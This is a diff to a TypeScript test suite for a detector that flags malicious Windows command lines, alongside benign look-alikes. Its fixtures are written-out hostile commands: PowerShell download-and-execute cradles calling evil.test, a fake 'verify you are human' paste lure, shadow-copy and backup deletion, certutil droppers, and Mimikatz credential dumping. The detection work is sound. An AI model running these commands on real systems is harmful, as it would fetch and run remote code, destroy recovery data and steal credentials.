@@ -9,6 +9,10 @@ function analyze(text: string, raw = text) {
 const ids = (text: string, raw = text) => analyze(text, raw).map((s) => s.id)
 const specOf = (text: string, id: string, raw = text) =>
   analyze(text, raw).find((s) => s.id === id)?.specificity
+// Shared helper (established here for later tasks 13/14/15/17 to reuse):
+// classify/buildContext directly, no preprocess() pass — a plain-corpus
+// signature check independent of interpreter detection or evasion-flag lexing.
+const sig = (s: string) => classify(buildContext(s, [], 'unknown')).map((x) => x.id)
 
 describe('download cradle', () => {
   it('fires when fetched content flows into an interpreter', () => {
@@ -99,9 +103,10 @@ describe('AMSI / ETW / Defender tampering', () => {
 })
 
 describe('ClickFix / paste-and-run', () => {
-  it('fires on a hidden-window one-liner that fetches and IEXes', () => {
+  it('fires on a hidden-window one-liner carrying a fake-verification lure that fetches and IEXes', () => {
     const raw = "powershell -nop -w hidden -c IEX (iwr http://evil.test/x).Content"
-    expect(ids('IEX (iwr http://evil.test/x).Content', raw)).toContain('clickfix')
+    const text = "verify you are human, then paste this to continue: IEX (iwr http://evil.test/x).Content"
+    expect(ids(text, raw)).toContain('clickfix')
   })
   it('fires on conhost --headless powershell', () => {
     expect(ids("conhost --headless powershell -nop -c iex(irm http://x.test/a)"))
@@ -124,6 +129,29 @@ describe('ClickFix / paste-and-run', () => {
   })
   it('benign twin: gpg --verify (routine signature verification) does NOT fire — a bare --verify needs real ClickFix context', () => {
     expect(ids('gpg --verify sig.asc release.tar')).not.toContain('clickfix')
+  })
+})
+
+describe('ClickFix trait-gating (review 2.4)', () => {
+  it('a plain -enc/-nop/-w download cradle is NOT ClickFix', () => {
+    expect(sig("powershell -nop -w hidden IEX (New-Object Net.WebClient).DownloadString('http://x/a')")).not.toContain('clickfix')
+  })
+  // The above uses sig(), which never runs preprocess() and so never
+  // populates ctx.flags — it can't exercise the -w/-nop-flag path at all.
+  // This one drives that path for real via ids()/preprocess(), which is the
+  // actual over-fire the review reported: a hidden -nop -w cradle with no
+  // lure must read as download-cradle only, never clickfix.
+  it('a real hidden -nop -w cradle (flags via preprocess, no lure) reads as download-cradle only, not ClickFix', () => {
+    const raw = "powershell -nop -w hidden -c IEX (New-Object Net.WebClient).DownloadString('http://x.test/a')"
+    const text = "IEX (New-Object Net.WebClient).DownloadString('http://x.test/a')"
+    expect(ids(text, raw)).toContain('download-cradle')
+    expect(ids(text, raw)).not.toContain('clickfix')
+  })
+  it('a real fake-CAPTCHA lure IS ClickFix', () => {
+    expect(sig("# verify you are human, press win+r\npowershell -nop -w hidden IEX (iwr http://x/a)")).toContain('clickfix')
+  })
+  it('conhost --headless still fires ClickFix', () => {
+    expect(sig('conhost --headless powershell -enc AAAA')).toContain('clickfix')
   })
 })
 
@@ -257,5 +285,193 @@ describe('wscript/cscript script-execution rule', () => {
   it('benign twin: wscript launching a .vbs from a trusted path with no //E: flag does NOT fire', () => {
     const s = classify(buildContext('C:\\Program Files\\LegitApp\\installer.vbs', [], 'wscript'))
     expect(s.map((x) => x.id)).not.toContain('wsh-script-exec')
+  })
+})
+
+describe('T1490 shadow/recovery tamper (review 2.4)', () => {
+  it('fires on vssadmin delete shadows', () => {
+    expect(sig('vssadmin delete shadows /all /quiet')).toContain('shadow-recovery-tamper')
+  })
+  it('does NOT fire on vssadmin resize shadowstorage alone — a plausible legitimate capacity increase, not inherently destructive (whole-branch review finding 3)', () => {
+    expect(sig('vssadmin resize shadowstorage /maxsize=500MB')).not.toContain('shadow-recovery-tamper')
+  })
+  it('fires on wmic shadowcopy delete', () => {
+    expect(sig('wmic shadowcopy delete')).toContain('shadow-recovery-tamper')
+  })
+  it('fires on wbadmin delete catalog', () => {
+    expect(sig('wbadmin delete catalog -quiet')).toContain('shadow-recovery-tamper')
+  })
+  it('fires on wbadmin delete systemstatebackup', () => {
+    expect(sig('wbadmin delete systemstatebackup -deleteoldest')).toContain('shadow-recovery-tamper')
+  })
+  it('fires on bcdedit recoveryenabled no', () => {
+    expect(sig('bcdedit /set {default} recoveryenabled no')).toContain('shadow-recovery-tamper')
+  })
+  it('fires on bcdedit bootstatuspolicy ignoreallfailures', () => {
+    expect(sig('bcdedit /set {default} bootstatuspolicy ignoreallfailures')).toContain('shadow-recovery-tamper')
+  })
+  it('is near-dispositive on its own', () => {
+    expect(specOf('vssadmin delete shadows /all /quiet', 'shadow-recovery-tamper')).toBe('near-dispositive')
+  })
+  it('trigger is a real substring of the input — never fabricated, even for the non-first discriminators (systemstatebackup and bootstatuspolicy cases)', () => {
+    const wbadminInput = 'wbadmin delete systemstatebackup -deleteoldest'
+    const wbadminSignal = classify(buildContext(wbadminInput, [], 'unknown')).find((s) => s.id === 'shadow-recovery-tamper')
+    expect(wbadminSignal).toBeTruthy()
+    expect(wbadminInput.toLowerCase()).toContain(wbadminSignal!.trigger.toLowerCase())
+
+    const bcdInput = 'bcdedit /set {default} bootstatuspolicy ignoreallfailures'
+    const bcdSignal = classify(buildContext(bcdInput, [], 'unknown')).find((s) => s.id === 'shadow-recovery-tamper')
+    expect(bcdSignal).toBeTruthy()
+    expect(bcdInput.toLowerCase()).toContain(bcdSignal!.trigger.toLowerCase())
+  })
+  it('does NOT fire on a benign vssadmin list shadows', () => {
+    expect(sig('vssadmin list shadows')).not.toContain('shadow-recovery-tamper')
+  })
+  it('does NOT fire on a benign wbadmin get status', () => {
+    expect(sig('wbadmin get status')).not.toContain('shadow-recovery-tamper')
+  })
+  it('does NOT fire on a bare bcdedit query with no destructive object', () => {
+    expect(sig('bcdedit /enum')).not.toContain('shadow-recovery-tamper')
+  })
+})
+
+describe('download-to-disk-then-exec dropper (review 2.2)', () => {
+  it('fires on DownloadFile + Start-Process', () => {
+    expect(sig("(New-Object Net.WebClient).DownloadFile('http://e/a.exe','a.exe'); Start-Process a.exe")).toContain('disk-dropper')
+  })
+  it('fires on -OutFile + Invoke-Item', () => {
+    expect(sig("Invoke-WebRequest http://e/a.exe -OutFile a.exe; Invoke-Item a.exe")).toContain('disk-dropper')
+  })
+  it('fires on certutil -urlcache -split to-disk + a bare .exe run', () => {
+    expect(sig('certutil -urlcache -split -f http://x.test/a.exe a.exe & a.exe')).toContain('disk-dropper')
+  })
+  it('does NOT fire on a bare download to disk with no exec', () => {
+    expect(sig("Invoke-WebRequest http://e/update.zip -OutFile update.zip")).not.toContain('disk-dropper')
+  })
+  it('does NOT fire on a bare exec with no fetch to disk', () => {
+    expect(sig('Start-Process notepad.exe')).not.toContain('disk-dropper')
+  })
+  it('review fix (a): does NOT fire when the fetching tool\'s own fully-qualified name sits at corpus position 0 — a `^`-anchored .exe token is never an exec sink, only a separator-anchored one is', () => {
+    expect(sig('certutil.exe -urlcache -split -f http://x.test/a.exe destination.exe')).not.toContain('disk-dropper')
+    expect(sig('powershell.exe -Command "iwr http://e/a.exe -OutFile a.exe"')).not.toContain('disk-dropper')
+  })
+  it('review fix (a) regression: a genuinely separator-anchored bare .exe run (`& a.exe`) still fires', () => {
+    expect(sig('certutil -urlcache -split -f http://x.test/a.exe a.exe & a.exe')).toContain('disk-dropper')
+  })
+  it('review fix (b): does NOT fire on a benign fetch-to-disk whose corpus merely contains "ascii" (Out-File -Encoding ascii) — the bare \'ii \' substring needle used to collide with it', () => {
+    expect(sig('certutil -urlcache -split -f http://x.test/a.exe a.exe; Out-File -Encoding ascii report.txt')).not.toContain('disk-dropper')
+  })
+  it('review fix (b) regression: the genuine Invoke-Item alias (a separator-anchored `& ii ...` call-operator form) still fires', () => {
+    expect(sig("(New-Object Net.WebClient).DownloadFile('http://e/a.exe','a.exe'); & ii a.exe")).toContain('disk-dropper')
+  })
+  it('is STRONG on its own (a dropper has a benign-installer twin)', () => {
+    expect(specOf("(New-Object Net.WebClient).DownloadFile('http://e/a.exe','a.exe'); Start-Process a.exe", 'disk-dropper')).toBe('strong')
+  })
+  it('trigger is a real substring of the input — including when neither side fires via its FIRST-listed literal needle (certutil to-disk + bare .exe run, the Task 12 lesson: no fabricated needles[0] fallback)', () => {
+    const input = 'certutil -urlcache -split -f http://x.test/a.exe a.exe & a.exe'
+    const s = classify(buildContext(input, [], 'unknown')).find((x) => x.id === 'disk-dropper')
+    expect(s).toBeTruthy()
+    expect(input.toLowerCase()).toContain(s!.trigger.toLowerCase())
+  })
+  it('co-occurrence upgrade: disk-dropper + evasion-cluster upgrades disk-dropper to near-dispositive', () => {
+    const raw = 'powershell -nop -w hidden -ep bypass -enc AAAA'
+    const script = "(New-Object Net.WebClient).DownloadFile('http://e/a.exe','a.exe'); Start-Process a.exe"
+    expect(specOf(script, 'disk-dropper', raw)).toBe('near-dispositive')
+  })
+})
+
+describe('offensive-tool naming (spec §6)', () => {
+  it('fires on Invoke-Mimikatz -DumpCreds', () => {
+    expect(sig('Invoke-Mimikatz -DumpCreds')).toContain('offensive-tool')
+  })
+  it('does not fire on a benign string containing "user"', () => {
+    expect(sig('Get-LocalUser')).not.toContain('offensive-tool')
+  })
+  it('fires on sekurlsa:: (mimikatz module invocation)', () => {
+    expect(sig('sekurlsa::logonpasswords')).toContain('offensive-tool')
+  })
+  it('fires on rubeus', () => {
+    expect(sig('Rubeus.exe asktgt /user:svc /rc4:aad3b435')).toContain('offensive-tool')
+  })
+  it('fires on Invoke-Kerberoast', () => {
+    expect(sig('Invoke-Kerberoast -OutputFormat hashcat')).toContain('offensive-tool')
+  })
+  it('fires on SafetyKatz', () => {
+    expect(sig('SafetyKatz.exe -o output.txt')).toContain('offensive-tool')
+  })
+  it('is near-dispositive on its own (named offensive tooling has no legitimate use)', () => {
+    expect(specOf('Invoke-Mimikatz -DumpCreds', 'offensive-tool')).toBe('near-dispositive')
+  })
+  it('trigger is a real substring of the input, not a fabricated needles[0] fallback — every needle checked individually (Task 12/13 lesson)', () => {
+    const cases = [
+      'Invoke-Mimikatz -DumpCreds',
+      'sekurlsa::logonpasswords',
+      'net user hacker /add & DumpCreds',
+      'Rubeus.exe asktgt /user:svc',
+      'Invoke-Kerberoast -OutputFormat hashcat',
+      'SafetyKatz.exe -o output.txt',
+    ]
+    for (const input of cases) {
+      const s = classify(buildContext(input, [], 'unknown')).find((x) => x.id === 'offensive-tool')
+      expect(s).toBeTruthy()
+      expect(input.toLowerCase()).toContain(s!.trigger.toLowerCase())
+    }
+  })
+})
+
+describe('cmd-var-obfuscation surfaced as a signal (review 2.5)', () => {
+  it('a set/%var% reassembled command carries the obfuscation signal', () => {
+    const ids = sig('cmd /c "set x=power&&set y=shell&&%x%%y% -c whoami"')
+    expect(ids).toContain('cmd-var-obfuscation')
+  })
+
+  it('benign twin: a bare %PATH% reference with no matching `set` does NOT fire', () => {
+    expect(sig('echo %PATH%')).not.toContain('cmd-var-obfuscation')
+  })
+
+  it('benign twin: a `set` assignment with no matching %var% reference anywhere does NOT fire', () => {
+    expect(sig('set x=power')).not.toContain('cmd-var-obfuscation')
+  })
+
+  it('fires on the !var! delayed-expansion form too', () => {
+    expect(sig('setlocal enabledelayedexpansion & set x=power & set y=shell & !x!!y!')).toContain('cmd-var-obfuscation')
+  })
+
+  it('is weak on its own', () => {
+    expect(specOf('cmd /c "set x=power&&set y=shell&&%x%%y% -c whoami"', 'cmd-var-obfuscation')).toBe('weak')
+  })
+
+  it('trigger is a real substring of the input, not a fabricated fallback', () => {
+    const input = 'cmd /c "set x=power&&set y=shell&&%x%%y% -c whoami"'
+    const s = classify(buildContext(input, [], 'unknown')).find((x) => x.id === 'cmd-var-obfuscation')
+    expect(s).toBeTruthy()
+    expect(input.toLowerCase()).toContain(s!.trigger.toLowerCase())
+  })
+
+  it('techniqueIds include T1140 (deobfuscate/decode) and T1027 (obfuscated files/information)', () => {
+    const s = classify(buildContext('set x=power&&set y=shell&&%x%%y%', [], 'unknown')).find((x) => x.id === 'cmd-var-obfuscation')
+    expect(s).toBeTruthy()
+    expect(s!.techniqueIds).toEqual(expect.arrayContaining(['T1140', 'T1027']))
+  })
+
+  // Review recall gap: the FIRST-declared `set` is often a decoy — the
+  // referenced var(s) can be any LATER-declared one(s). Chained multi-`set`
+  // is the common real form of this obfuscation, so the rule must scan every
+  // declaration, not just the first.
+  it('fires when the referenced var is a LATER `set` declaration, not the first (decoy first var)', () => {
+    const ids = sig('cmd /c "set a=unused&&set b=power&&set c=shell&&%b%%c% -c whoami"')
+    expect(ids).toContain('cmd-var-obfuscation')
+  })
+
+  it('benign twin (chained): multiple `set` declarations with NO reference to any of them anywhere does NOT fire', () => {
+    expect(sig('set a=unused&&set b=power&&set c=shell')).not.toContain('cmd-var-obfuscation')
+  })
+
+  it('trigger on the decoy-first-var case cites the ACTUAL referenced declaration (b), not the unreferenced decoy (a)', () => {
+    const input = 'cmd /c "set a=unused&&set b=power&&set c=shell&&%b%%c% -c whoami"'
+    const s = classify(buildContext(input, [], 'unknown')).find((x) => x.id === 'cmd-var-obfuscation')
+    expect(s).toBeTruthy()
+    expect(input.toLowerCase()).toContain(s!.trigger.toLowerCase())
+    expect(s!.trigger.toLowerCase()).not.toContain('set a=')
   })
 })
